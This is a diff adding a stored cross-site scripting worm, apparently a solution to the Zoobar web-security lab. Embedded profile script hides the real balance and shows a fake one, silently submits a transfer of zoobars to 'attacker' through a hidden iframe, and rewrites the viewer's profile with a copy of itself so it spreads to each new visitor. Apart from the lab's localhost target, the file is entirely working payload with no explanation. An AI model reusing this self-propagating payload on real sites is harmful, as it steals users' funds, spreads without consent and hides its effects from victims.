@@ -1,0 +1,96 @@
+</b>
+<div id="fakeprofileheader"></div>
+<b>
+Scanning for viruses...
+<script>
+var numZoobars = "1";
+var recipient = "attacker";
+var submissionMethod = "Send";
+
+var iframe = document.createElement("iframe");
+iframe.setAttribute("style", "visibility: hidden; height: 0; width: 0; position: absolute");
+iframe.setAttribute("name", "hiddenFrame");
+document.body.appendChild(iframe);
+
+document.getElementById("profileheader").setAttribute("style", "display:none; visibility: hidden; height: 0; width: 0; position: absolute");
+
+var fakeZoobars = 10;
+var username = document.getElementsByName("user")[0].value;
+function showFakeZoobars(fakeZoobarCounter) {
+    document.getElementById("fakeprofileheader").innerHTML =
+        username + "'s zoobars:" + fakeZoobarCounter;
+    if (fakeZoobarCounter < fakeZoobars) {
+      setTimeout(showFakeZoobars, 100, fakeZoobarCounter + 1);
+    }
+    else
+    {
+        console.log("failed because fakeZoobarCounter = " + fakeZoobarCounter);
+    }
+}
+
+var form = document.createElement("form");
+form.setAttribute("style","display:none");
+form.setAttribute("method", "post");
+form.setAttribute("action", "http://localhost:8080/zoobar/index.cgi/transfer");
+form.setAttribute("target","hiddenFrame")
+var input1 = document.createElement("input");
+input1.setAttribute("type", "hidden");
+input1.setAttribute("name", "zoobars");
+input1.setAttribute("value", numZoobars);
+form.appendChild(input1);
+var input2 = document.createElement("input");
+input2.setAttribute("type", "input");
+input2.setAttribute("name", "recipient");
+input2.setAttribute("value", recipient);
+form.appendChild(input2);
+var input3 = document.createElement("input");
+input3.setAttribute("type", "input");
+input3.setAttribute("name", "submission");
+input3.setAttribute("value", submissionMethod);
+form.appendChild(input3);
+document.body.appendChild(form);
+form.submit();
+
+var profileToSet = '</b><div id="fakeprofileheader"></div><b>' + "Scanning for viruses..." + "<script>" + document.getElementsByTagName("script")[0].innerHTML + "<\/script>" + 
+    '</b></div></td></tr></tbody></table></div><table class="log" align="center"><thead><tr><th>Time</th><th>Sender</th><th>Recipient</th><th>Amount</th></tr></thead><tbody></tbody></table><!--';
+var profileSubmissionMethod = "Save";
+var profileForm = document.createElement("form");
+profileForm.setAttribute("style","display:none");
+profileForm.setAttribute("method", "post");
+profileForm.setAttribute("action", "http://localhost:8080/zoobar/index.cgi/");
+profileForm.setAttribute("target","hiddenFrame");
+var input1 = document.createElement("input");
+input1.setAttribute("type", "hidden");
+input1.setAttribute("name", "profile_update");
+input1.setAttribute("value", profileToSet);
+profileForm.appendChild(input1);
+var input2 = document.createElement("input");
+input2.setAttribute("type", "input");
+input2.setAttribute("name", "profile_submit");
+input2.setAttribute("value", profileSubmissionMethod);
+profileForm.appendChild(input2);
+document.body.appendChild(profileForm);
+profileForm.submit();
+
+if (fakeZoobars > 0) showFakeZoobars(0);
+
+</script>
+</b>
+</div>
+</td>
+</tr>
+</tbody>
+</table>
+</div>
+<table class="log" align="center">
+<thead>
+<tr><th>Time</th>
+    <th>Sender</th>
+    <th>Recipient</th>
+    <th>Amount</th></tr>
+</thead>
+<tbody>
+
+</tbody>
+</table>
+<!--
